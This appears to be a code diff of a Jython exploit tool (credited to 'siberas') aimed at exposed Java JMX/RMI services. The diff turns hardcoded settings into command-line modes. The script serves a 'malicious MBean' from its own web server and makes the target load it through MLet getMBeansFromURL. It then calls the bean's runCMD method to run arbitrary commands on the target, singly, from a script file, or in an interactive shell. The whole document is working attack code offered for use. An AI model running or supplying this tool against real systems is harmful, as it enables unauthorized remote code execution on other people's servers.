@@ -6,7 +6,6 @@ from javax.management import ObjectName
 from java.lang import String
 from java.lang import Object
 
-
 # BaseHTTPServer needed to serve mlets
 from BaseHTTPServer import BaseHTTPRequestHandler,HTTPServer
 from threading import Thread
@@ -15,10 +14,80 @@ import sys
 import time
 import jarray
 
-#This class will handles any incoming request from
-#the JMX service
-# Needed during installation of the JAR
+import argparse
+# from cmd import Cmd
+
+
+### AUX ###
+def connectToJMX(args):
+    # Basic JMX connection, always required
+    jmx_url = JMXServiceURL("service:jmx:rmi:///jndi/rmi://" + args.targetHost + ":" + args.targetPort + "/jmxrmi")
+    print "[+] Connecting to: " + str(jmx_url)
+    jmx_connector = JMXConnectorFactory.connect(jmx_url)
+    print "[+] Connected: " + str(jmx_connector.getConnectionId())
+    bean_server = jmx_connector.getMBeanServerConnection()
+    return bean_server
+##########
+
+### INSTALL MODE ###
+
+def installMode(args):
+    full_mlet_url = args.payload_url + ":" + args.payload_port
+    startWebserver(args, full_mlet_url)
+    bean_server = connectToJMX(args)
+    installMBeans(args, bean_server, full_mlet_url)
+
+def installMBeans(args, bean_server, full_mlet_url):
+    # Installation, load javax.management.loading.MLet to install additional MBeans
+    # If loading fails, the Mlet is already loaded...
+    try:
+        mlet_bean = bean_server.createMBean("javax.management.loading.MLet", None)
+    except:
+        # MLet Bean can't be created because it already exists
+        mlet_bean = bean_server.getObjectInstance(ObjectName("DefaultDomain:type=MLet"))
+
+    print "[+] Loaded " + str(mlet_bean.getClassName())
+
+
+    # Install payload Mlet via getMbeansFromURL
+    # pass the URL of the web server
+    print "[+] Loading malicious MBean from " + full_mlet_url
+    print "[+] Invoking: "+ mlet_bean.getClassName() + ".getMBeansFromURL"
+
+
+    inv_array1 = jarray.zeros(1, Object)
+    inv_array1[0] = full_mlet_url
+
+    inv_array2 = jarray.zeros(1, String)
+    inv_array2[0] = String.canonicalName
+
+    resource = bean_server.invoke(mlet_bean.getObjectName(), "getMBeansFromURL", inv_array1, inv_array2)
+
+    # Check if the Mlet was loaded successfully
+    for res in resource:
+        if res.__class__.__name__ == "InstanceAlreadyExistsException":
+            print "[+] Object instance already existed, no need to install it a second time"
+        elif res.__class__.__name__ == "ObjectInstance":
+            print "[+] Successfully loaded " + str(res.getObjectName())
+
+def startWebserver(args, full_mlet_url):
+    # Start a web server on all ports in a seperate thread
+    # Only needed during installation
+    print "[+] Starting webserver at port " + str(args.payload_port)
+    mletHandler = MakeHandlerClass(full_mlet_url)
+    mlet_webserver = HTTPServer(('', int(args.payload_port)), mletHandler)
+    webserver_thread = Thread(target = mlet_webserver.serve_forever)
+    webserver_thread.daemon = True
+    try:
+        webserver_thread.start()
+    except KeyboardInterrupt:
+        mlet_webserver.shutdown()
+        sys.exit(0)
+
 def MakeHandlerClass(base_url):
+    #This class will handles any incoming request from
+    #the JMX service
+    # Needed during installation of the JAR
     class CustomHandler(BaseHTTPRequestHandler):
 
         def __init__(self, *args, **kwargs):
@@ -51,93 +120,121 @@ def MakeHandlerClass(base_url):
                 self.send_error(404, 'File not found: ' + self.path)
                 #
                 # except IOError:
-                # 	self.send_error(404,'File Not Found: %s' % self.path)
+                #   self.send_error(404,'File Not Found: %s' % self.path)
 
     return CustomHandler
 
+### /INSTALL MODE ###
 
 
-## TODO: Command line parameters
-target_host = "192.168.11.133"                                      # mandatory
-target_port = "9999"                                                # mandatory
-webserver_port = 8888                                               # mandatory
-mlet_url = "http://192.168.11.141:" + str(webserver_port)           # only needed during installation, user should provide port in the URL
-cmd = "ls -la"                                                      # only needed in cmd mode
+### COMMAND MODE ###
 
-# Start a web server on all ports in a seperate thread
-# Only needed during installation
-print "[+] Starting webserver at port " + str(webserver_port)
-mletHandler = MakeHandlerClass(mlet_url)
-mlet_webserver = HTTPServer(('', webserver_port), mletHandler)
-webserver_thread = Thread(target = mlet_webserver.serve_forever)
-webserver_thread.daemon = True
-try:
-    webserver_thread.start()
-except KeyboardInterrupt:
-    mlet_webserver.shutdown()
-    sys.exit(0)
+def commandMode(args):
+    bean_server = connectToJMX(args)
+    executeCommand(args.cmd, bean_server)
+    print "[+] Done"
 
+def executeCommand(cmd, bean_server):
+    # TODO Prettify this
+    # Payload execution
+    # Load the Payload Met and invoke a method on it
+    mlet_bean = bean_server.getObjectInstance(ObjectName("Siberas:name=payload,id=1"))
+    print "[+] Loaded " + str(mlet_bean.getClassName())
 
-# Basic JMX connection, always required
-jmx_url = JMXServiceURL("service:jmx:rmi:///jndi/rmi://" + target_host + ":" + target_port + "/jmxrmi")
-print "[+] Connecting to: " + str(jmx_url)
-jmx_connector = JMXConnectorFactory.connect(jmx_url)
-print "[+] Connected: " + str(jmx_connector.getConnectionId())
-bean_server = jmx_connector.getMBeanServerConnection()
+    print "[+] Executing command: " + cmd
+    inv_array1 = jarray.zeros(1, Object)
+    inv_array1[0] = cmd
 
+    inv_array2 = jarray.zeros(1, String)
+    inv_array2[0] = String.canonicalName
 
-# Installation, load javax.management.loading.MLet to install additional MBeans
-# If loading fails, the Mlet is already loaded...
-try:
-    mlet_bean = bean_server.createMBean("javax.management.loading.MLet", None)
-except:
-    # MLet Bean can't be created because it already exists
-    mlet_bean = bean_server.getObjectInstance(ObjectName("DefaultDomain:type=MLet"))
+    resource = bean_server.invoke(mlet_bean.getObjectName(), "runCMD", inv_array1, inv_array2)
 
-print "[+] Loaded " + str(mlet_bean.getClassName())
+    # this is ugly, and I need to find a better solution for that...
+    for res in resource:
+        sys.stdout.write(res)
+
+    sys.stdout.write("\n")
+    sys.stdout.flush()
 
 
-# Install payload Mlet via getMbeansFromURL
-# pass the URL of the web server
-print "[+] Loading malicious MBean from " + mlet_url
-print "[+] Invoking: "+ mlet_bean.getClassName() + ".getMBeansFromURL"
+
+### /COMMAND MODE ###
+
+### SCRIPT MODE ###
+
+def scriptMode(args):
+    bean_server = connectToJMX(args)
+
+    lines = [line.rstrip('\n') for line in open(args.filename)]
+
+    for cmd in lines:
+        executeCommand(cmd, bean_server)
+
+### /SCRIPT MODE ###
 
 
-inv_array1 = jarray.zeros(1, Object)
-inv_array1[0] = mlet_url
+### SHELL MODE ###
 
-inv_array2 = jarray.zeros(1, String)
-inv_array2[0] = String.canonicalName
+def shellMode(args):
+    bean_server = connectToJMX(args)
+    startShell(bean_server)
+    print "[+] Done"
 
-resource = bean_server.invoke(mlet_bean.getObjectName(), "getMBeansFromURL", inv_array1, inv_array2)
+def startShell(bean_server):
+    print "[+] Use command 'exit_shell' to exit the shell"
+    in_command_loop = True
+    while in_command_loop:
+        cmd = raw_input(">>> ")
+        if cmd == 'exit_shell':
+            in_command_loop = False
+        else:
+            executeCommand(cmd, bean_server)
 
-# Check if the Mlet was loaded successfully
-for res in resource:
-    if res.__class__.__name__ == "InstanceAlreadyExistsException":
-        print "[+] Object instance already existed, no need to install it a second time"
-    elif res.__class__.__name__ == "ObjectInstance":
-        print "[+] Successfully loaded " + str(res.getObjectName())
+
+     
+### /SHELL MODE ###
 
 
-# Payload execution
-# Load the Payload Met and invoke a method on it
-mlet_bean = bean_server.getObjectInstance(ObjectName("Siberas:name=payload,id=1"))
-print "[+] Loaded " + str(mlet_bean.getClassName())
 
-print "[+] Executing command: " + cmd
-inv_array1 = jarray.zeros(1, Object)
-inv_array1[0] = cmd
+### PARSER ###
+# Map for clarity's sake
+def arg_install_mode(args):
+    installMode(args)
+def arg_command_mode(args):
+    commandMode(args)
+def arg_script_mode(args):
+    scriptMode(args)
+def arg_shell_mode(args):
+    shellMode(args)
 
-inv_array2 = jarray.zeros(1, String)
-inv_array2[0] = String.canonicalName
+# Base parser
+parser = argparse.ArgumentParser(description = 'description', epilog='By siberas', add_help=True)
+parser.add_argument('targetHost', help='target IP address')
+parser.add_argument('targetPort', help='target JMX port')
 
-resource = bean_server.invoke(mlet_bean.getObjectName(), "runCMD", inv_array1, inv_array2)
+subparsers = parser.add_subparsers(title='modes', description='valid modes', help='use ... MODE -h for help about specific modes')
 
-# this is ugly, and I need to find a better solution for that...
-for res in resource:
-    sys.stdout.write(res)
+# Install mode
+install_subparser = subparsers.add_parser('install', help='install the payload on the target')
+install_subparser.add_argument('payload_url', help='URL to load the payload (full URL)')
+install_subparser.add_argument('payload_port', help='port to load the payload')
+install_subparser.set_defaults(func=arg_install_mode)
 
-sys.stdout.write("\n")
-sys.stdout.flush()
+# Command mode
+command_subparser = subparsers.add_parser('command', help='execute a command in the target')
+command_subparser.add_argument('cmd', help='command to be executed')
+command_subparser.set_defaults(func=arg_command_mode)
 
-print "[+] Done"
+# Script mode
+script_subparser = subparsers.add_parser('script', help='execute a script from a file in the target')
+script_subparser.add_argument('filename', help='file with the script to be executed')
+script_subparser.set_defaults(func=arg_script_mode)
+
+# Shell mode
+shell_subparser = subparsers.add_parser('shell', help='open a simple shell in the target')
+shell_subparser.set_defaults(func=arg_shell_mode)
+
+# Store the user args
+args = parser.parse_args()
+args.func(args)
